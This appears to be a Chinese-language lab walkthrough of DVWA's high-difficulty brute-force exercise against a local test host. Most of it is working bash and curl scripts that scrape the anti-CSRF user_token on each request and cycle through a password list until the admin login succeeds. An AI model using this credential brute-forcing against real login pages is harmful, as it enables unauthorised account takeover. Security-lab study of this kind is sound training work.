# 1. **Brute Force**

### 觀察

可以發現多了一組 `user_token` 來阻礙你，每次重整或送出後會改變

```
http://dvwa.localtest/vulnerabilities/brute/index.php? \
username=admin&password=123&Login=Login& \
user_token=d29558d3f146d02653aa0c3afaf87a95#
```

跟被埋在前端的 CSRF token 的概念一樣，所以只要想辦法將它一起送出就 ok 了

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/6dcb2c17-07f1-4baa-a9f8-e52ef3d2ac0f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T102614Z&X-Amz-Expires=86400&X-Amz-Signature=de44064ab2931490451f6cf12c973d7c7f9b61bbff723b69491f9b51efeb298c&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

只要在腳本從 DOM 中擷取這段 token 後，送出就行了，接下來就跟 medium 難度一樣，慢慢等待

加上 token 的 request

```bash
# try apssword
curl -v -c cookies.txt -b cookies.txt \
"http://dvwa.localtest/vulnerabilities/brute/index.php?username=${USER}&password=${LOGIN_PASSWORD}&Login=Login&user_token=${TOKEN}#"
```

驗證分別送兩次 curl requst 是可行的，第二個 request (`# try apssword` 這段) 不加上 `-L` 的跳轉參數，以及直接 GET 更新密碼的 endpoint ( `"http://dvwa.localtest/vulnerabilities/brute/index.php?username=${USER}&password=${LOGIN_PASSWORD}&Login=Login&user_token=${TOKEN}#`)

test script

```bash
#!/usr/bin/env bash
# DVWA host
HOST=http://dvwa.localtest
# create cookie and save csrf token
CSRF=`curl -s -L -c cookies.txt -b cookies.txt "${HOST}/login.php" | grep user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`
# save session id
SESSIONID=$(grep PHPSESSID cookies.txt | cut -d $'\t' -f7)

# user & password for login to start tasks
USER=admin
LOGIN_PASSWORD=password

# login at login page
curl -v -L -c cookies.txt -b cookies.txt \
-X POST "${HOST}/login.php" \
--data-raw \
"username=${USER}&password=${LOGIN_PASSWORD}&Login=Login&user_token=${CSRF}"

# get token at /vulnerabilities/brute page
TOKEN=`curl -v -L -c cookies.txt -b cookies.txt \
"${HOST}/vulnerabilities/brute/?username=${USER}&password=${LOGIN_PASSWORD}&Login=Login#" \
| grep  user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`

echo "---------"
echo $TOKEN
echo "---------"

# try apssword
curl -v -c cookies.txt -b cookies.txt "http://dvwa.localtest/vulnerabilities/brute/index.php?username=${USER}&password=${LOGIN_PASSWORD}&Login=Login&user_token=${TOKEN}#"
```
先手動測試登入後取得 token．接著繼續測試下一個 request 改密碼
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b3ec58d2-cd48-41d9-98d0-9f7cccc1a9c8/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T102644Z&X-Amz-Expires=86400&X-Amz-Signature=382242e422760ade49b88941e4b4e45aa70a873372f65a0d2cfa46a759b22ec1&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

不看正常登入的部分的話，實際上在 try 密碼的就是這部分

```bash
# read each line of password list file
filename='../10-million-password-list-top-100.txt'

while read line; do
  echo "using user: $USER and password: $line"

  # get token at /vulnerabilities/brute page
  TOKEN=`curl -v -L -c cookies.txt -b cookies.txt \
  "${HOST}/vulnerabilities/brute/?username=${USER}&password=${LOGIN_PASSWORD}&Login=Login#" \
  | grep  user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`

  echo "---------"
  echo $TOKEN
  echo "---------"

  # enter username and password in brute force page: /vulnerabilities/brute/
  RES=`curl -v -c cookies.txt -b cookies.txt "${HOST}/vulnerabilities/brute/index.php?username=${USER}&password=${line}&Login=Login&user_token=${TOKEN}#"`

  if [[ $RES == *"Welcome to the password protected area admin"* ]]; then
    printf "\n 🎉 password found: $line using user: ${USER} token: ${TOKEN}\n"
    exit 0
  else
    printf "\n 🥲 trying password: $line but failed.\n"
  fi

done < $filename
```

不看正常登入的部分的話，實際上在 try 密碼的就是這部分

```bash
# read each line of password list file
filename='../10-million-password-list-top-100.txt'

while read line; do
  echo "using user: $USER and password: $line"

  # get token at /vulnerabilities/brute page
  TOKEN=`curl -v -L -c cookies.txt -b cookies.txt \
  "${HOST}/vulnerabilities/brute/?username=${USER}&password=${LOGIN_PASSWORD}&Login=Login#" \
  | grep  user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`

  echo "---------"
  echo $TOKEN
  echo "---------"

  # enter username and password in brute force page: /vulnerabilities/brute/
  RES=`curl -v -c cookies.txt -b cookies.txt "${HOST}/vulnerabilities/brute/index.php?username=${USER}&password=${line}&Login=Login&user_token=${TOKEN}#"`

  if [[ $RES == *"Welcome to the password protected area admin"* ]]; then
    printf "\n 🎉 password found: $line using user: ${USER} token: ${TOKEN}\n"
    exit 0
  else
    printf "\n 🥲 trying password: $line but failed.\n"
  fi

done < $filename
```

完整的腳本

`brute-force-walkthrough-high.sh`

```bash
#!/usr/bin/env bash
# DVWA host
HOST=http://dvwa.localtest
# create cookie and save csrf token
CSRF=`curl -s -L -c cookies.txt -b cookies.txt "${HOST}/login.php" | grep user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`
# save session id
SESSIONID=$(grep PHPSESSID cookies.txt | cut -d $'\t' -f7)

# user & password for login to start tasks
USER=admin
LOGIN_PASSWORD=password

# login at login page
curl -v -L -c cookies.txt -b cookies.txt \
-X POST "${HOST}/login.php" \
--data-raw \
"username=${USER}&password=${LOGIN_PASSWORD}&Login=Login&user_token=${CSRF}"

# read each line of password list file
filename='../10-million-password-list-top-100.txt'

start=`date +%s`
while read line; do
  echo "using user: $USER and password: $line"

  # get token at /vulnerabilities/brute page
  TOKEN=`curl -v -L -c cookies.txt -b cookies.txt \
  "${HOST}/vulnerabilities/brute/?username=${USER}&password=${LOGIN_PASSWORD}&Login=Login#" \
  | grep  user_token  | grep -oE \[a-z0-9\]+ | awk 'length >= 10'`

  echo "---------"
  echo $TOKEN
  echo "---------"

  # enter username and password in brute force page: /vulnerabilities/brute/
  RES=`curl -v -c cookies.txt -b cookies.txt "${HOST}/vulnerabilities/brute/index.php?username=${USER}&password=${line}&Login=Login&user_token=${TOKEN}#"`

  if [[ $RES == *"Welcome to the password protected area admin"* ]]; then
    end=`date +%s`
    runtime=$((end-start))
    printf "\n 🎉 password found: $line , using user: ${USER} and token: ${TOKEN}\n"
    printf "\n elapsed time: ${runtime}s \n"
    exit 0
  else
    printf "\n 🥲 trying password: $line but failed.\n"
  fi

done < $filename
```

### Done

```bash
./brute-force-walkthrough-high.sh
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/f45a381c-9f80-437f-9765-99f5f2e37d5d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T102902Z&X-Amz-Expires=86400&X-Amz-Signature=d4eef44c618e90daeb0740873793ab6cebb6f4fb387c115ed722af71674d7133&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

將正確密碼往下移一點，試試看會花多少時間

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/de310e4a-a1cc-4ef0-bbdc-93103d867dac/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45EIPT3X45%2F20220217%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20220217T102925Z&X-Amz-Expires=86400&X-Amz-Signature=078fc79a5390d6edf0ad012b554f2c6934cd53d71ac8b050fd3f19906315de5b&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22&x-id=GetObject)

花了 32 秒
